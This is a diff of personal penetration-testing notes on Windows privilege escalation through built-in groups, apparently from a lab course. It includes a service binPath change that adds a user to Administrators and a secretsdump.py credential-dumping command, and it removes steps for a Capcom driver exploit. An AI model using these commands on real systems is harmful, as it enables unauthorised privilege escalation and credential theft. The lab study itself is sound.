@@ -18,7 +18,7 @@ wevtutil qe Security /rd:true /f:text | Select-String "/user"
 >[!WARN]
 > Need to get more info on this
 
->#### DNSAdmins Group
+# DNSAdmins Group
 
 **Checks whether you are part of the group** 
 ```
@@ -83,28 +83,21 @@ Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerN
 >  Recommended to use CMD, not powershell 
 >  Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31
 
-####  Hyper-V Administrators
+## Hyper-V Administrators
 
 - have access to all hyper v features 
 - if domain controllers have been virtualized, then virtualization admins should be considered domain admins 
 - deleting virtual machine attempts to restore original file permissions on corresponding .vhdx file 
-#### Print Operators
+## Print Operators
 - Grants SeLoadDriverPrivilege, which is ability to to administer/connect/disconnect printers as well as login to domain controller
 
 
 
-> [!NOTE]
-> 1. Download tool to enable privilege (https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
-> 2. Compile privilege using cl.exe from visual studio 
-> 3. Downloadcapcom.sys file  to ``C:\temp``
-> 4. Add reference to drive 
-> 5. Check to make sure capcom driver is not loaded
-> 6. Check it has been enabled 
-> 7. Launch exploit using exploitcapcom.exe
+>[!NOTE]
 
-####  Server Operators 
+
+## Server Operators 
 - Grants SeBackupPrivilege and SeRestorePrivilege 
-- SeBackupPrivilege
 
 **Enumeration**
 ```
@@ -120,9 +113,9 @@ Get-Service -Name AppReadiness | Select-Object *
 c:\Tools\PsService.exe security AppReadiness 
 
 ```
-Payload/Priv Esc
-> [!NOTE] Payload Consideration
-> All of what is mentioned below is REQUIRED to get this to work, none of it is not important 
+
+>[!NOTE] Payload Consideration
+>All of what is mentioned below is REQUIRED to get this to work, none of it is not important 
 
 ```
 sc config AppReadiness binPath="cmd /c net localgroup Administrators server_adm /add"
@@ -132,7 +125,7 @@ net localgroup Administrators
 ```
 
 - AppReadiness is misconfigured to allow Server Operators full control and let them change how a service starts 
--  ONly possible if someon has service_all_access
+-  Only possible if someon has service_all_access
 **Data Exfilitration**
 ```bash
 secretsdump.py server_adm@10.129.43.42
